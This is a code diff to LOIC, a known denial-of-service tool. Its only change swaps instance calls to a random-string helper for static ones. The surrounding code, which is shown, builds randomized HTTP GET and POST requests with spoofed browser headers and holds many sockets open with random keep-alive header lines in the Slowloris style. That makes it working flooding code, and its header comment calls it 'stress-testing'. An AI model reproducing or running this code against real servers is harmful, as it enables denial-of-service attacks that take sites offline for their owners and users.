@@ -1,4 +1,4 @@
-﻿/* collection of some upper layer protocol stress-testing
+/* collection of some upper layer protocol stress-testing
  * loosely based on the slow-loris attempts and other low bandwidth attempts
  * 
  * and always remember:
@@ -191,7 +191,7 @@ namespace LOIC
                             socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
                             if (_random == true)
                             {
-                                sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                                sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                             }
                             socket.Send(sbuf);
                         }
@@ -421,7 +421,7 @@ namespace LOIC
                     {
                         if (_random == true)
                         {
-                            sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                            sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                         }
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         try
@@ -448,7 +448,7 @@ namespace LOIC
                     State = ReqState.Requesting;
                     if (_randcmds)
                     {
-                        tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", new Functions().RandomString(), Environment.NewLine));
+                        tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
                     }
                     for (int i = (_lSockets.Count - 1); i >= 0; i--)
                     { // keep the sockets alive
